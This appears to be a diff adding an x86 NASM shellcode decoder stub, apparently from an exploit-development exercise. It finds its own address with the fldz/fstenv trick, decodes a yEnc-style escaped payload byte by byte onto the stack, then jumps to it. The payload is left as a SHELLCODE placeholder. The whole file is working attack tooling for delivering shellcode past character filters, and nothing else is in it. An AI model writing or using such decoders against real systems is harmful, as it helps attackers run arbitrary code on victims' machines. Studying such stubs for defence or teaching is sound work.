@@ -1,0 +1,46 @@
+global _start
+
+section .text
+_start:
+	xor ecx, ecx
+	mul ecx				; make eax and edx zero, as well
+
+	fldz				; retrieve shellcode address via fldz
+	jmp decoder_pc
+
+	; the shellcode address is 4 bytes below of fldz
+	decoder_shellcode: db SHELLCODE
+	; get the shellcode length by using the $ identifier (which evaluates to
+	; the current address)
+	decoder_length: equ $ - decoder_shellcode
+
+decoder_pc:
+	; the FPU structure in memory contains the address of the last FPU
+	; instruction on byte 0xc (the previous 3 bytes are composed of the
+	; control, status and tag word)
+	fstenv [esp - 0xc]
+	pop eax
+	lea esi, [eax + 0x4]		; the shellcode is 4 bytes below
+
+	mov cl, decoder_length
+decoder_loop:
+	cmp byte [esi], 0x3d		; check if it is a regular character
+	jnz decoder_regular		; not an escaped character
+
+	inc esi				; grab the next character, instead
+	sub byte [esi], 0x40		; per the draft, subtract 0x40
+	dec ecx				; the escape character was skipped
+decoder_regular:
+	sub byte [esi], 0x2a		; per the draft, subtract 0x2a
+	mov al, [esi]			; can't mov m8, m8
+	mov [esp], al			; move decoded character to the stack
+	inc esi				; go to the next character
+	inc esp				; increase stack for the next one
+	inc edx				; save number of copied characters
+	loop decoder_loop
+
+	; before jumping to the stack, its pointer needs to be adjusted by the
+	; number of copied characters; besides this also avoids the shellcode
+	; potentially overwriting itself with push instructions
+	sub esp, edx
+	jmp esp				; finally jump to the shellcode
